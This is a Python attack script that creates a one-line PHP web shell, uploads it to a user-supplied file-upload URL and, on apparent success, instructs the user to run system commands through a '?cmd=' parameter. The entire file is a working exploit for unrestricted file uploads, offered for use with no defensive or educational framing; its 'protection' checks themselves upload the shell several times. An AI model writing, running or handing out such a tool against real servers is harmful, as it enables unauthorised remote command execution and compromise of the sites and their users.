import requests
import os
import sys
from urllib.parse import urlparse

def validate_url(url):
    # Validate the URL
    if not url.startswith("http://") and not url.startswith("https://"):
        print("Invalid URL. Please enter a valid URL starting with 'http://' or 'https://'.")
        sys.exit(1)

def create_exploit_file(filename):
    # Create the exploit file
    with open(filename, "w") as f:
        f.write("<?php system($_GET['cmd']); ?>")

def upload_exploit(url, filename):
    # Prepare the file upload
    files = {"file": (filename, open(filename, "rb"))}

    # Send the POST request with the exploit file
    try:
        response = requests.post(url, files=files)
    except requests.exceptions.RequestException as e:
        print("An error occurred while sending the request:", e)
        sys.exit(1)

    return response

def check_exploit_success(response, filename):
    # Check if the exploit was successful
    if filename in response.text:
        print("Exploit successful!")
        print("Execute commands by appending ?cmd=<command> to the URL.")
    else:
        print("Exploit failed.")

def cleanup(filename):
    # Clean up the exploit file
    os.remove(filename)

def main():
    # Get the target URL from user input
    url = input("Enter the target upload URL: ")
    validate_url(url)

    # Local file to upload
    filename = "exploit.php"
    create_exploit_file(filename)

    # Check if the target URL is accessible
    try:
        response = requests.get(url)
        if response.status_code != 200:
            print("Target URL is not accessible.")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print("An error occurred while accessing the target URL:", e)
        sys.exit(1)

    # Check if the target URL is protected by rate limiting
    try:
        response = requests.post(url, files={"file": (filename, open(filename, "rb"))})
        if response.status_code == 429:
            print("Target URL is protected by rate limiting.")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print("An error occurred while sending the request:", e)
        sys.exit(1)

    # Check if the target URL is protected by input validation
    try:
        response = requests.post(url, files={"file": (filename, open(filename, "rb"))})
        if "uploaded successfully" not in response.text:
            print("Target URL is protected by input validation.")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print("An error occurred while sending the request:", e)
        sys.exit(1)

    # Upload the exploit file
    response = upload_exploit(url, filename)

    # Check if the exploit was successful
    check_exploit_success(response, filename)

    # Clean up the exploit file
    cleanup(filename)

if __name__ == "__main__":
    main()
